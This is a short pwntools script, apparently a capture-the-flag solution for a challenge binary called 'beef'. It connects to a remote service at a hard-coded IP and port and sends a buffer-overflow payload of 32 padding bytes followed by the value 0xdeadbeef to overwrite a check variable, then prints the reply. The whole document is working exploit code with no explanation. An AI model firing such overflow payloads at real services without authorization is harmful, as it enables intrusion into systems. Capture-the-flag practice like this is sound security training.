from pwn import *

# io = process('./beef')
io = remote('139.144.184.150', 31337)
io.recvuntil(b'Enter the secret word: ')
io.sendline(b'A'*32 + p64(0xdeadbeef))
print(io.recvall().decode())